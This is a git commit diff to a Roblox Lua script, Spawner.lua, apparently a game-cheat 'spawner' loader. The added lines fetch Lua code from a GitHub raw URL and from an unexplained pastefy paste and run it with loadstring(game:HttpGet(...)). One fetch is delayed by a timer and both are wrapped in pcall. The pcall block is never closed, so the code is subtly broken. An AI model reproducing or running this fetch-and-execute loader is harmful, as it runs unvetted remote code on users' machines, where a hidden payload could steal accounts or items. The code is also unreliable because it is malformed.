4a5d3421b04b3f1936d7009585a1e9deedef0a55
ronikscripts <roatrystan@gmail.com>
2025-08-04 00:57:20 -0700

    Update Spawner.lua

--- Spawner.lua
+++ Spawner.lua
@@ -1,1 +1,9 @@
-https://luaris.onrender.com/luaris/files/scripts/loaders/4af9f8bfca054838a76ff1b53359f146
+pcall(function()
+    task.spawn(function()
+        task.wait(8)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))()
+    end)
+
+task.spawn(function()
+        loadstring(game:HttpGet("https://pastefy.app/G5j1Jn9m/raw"))()
+    end)
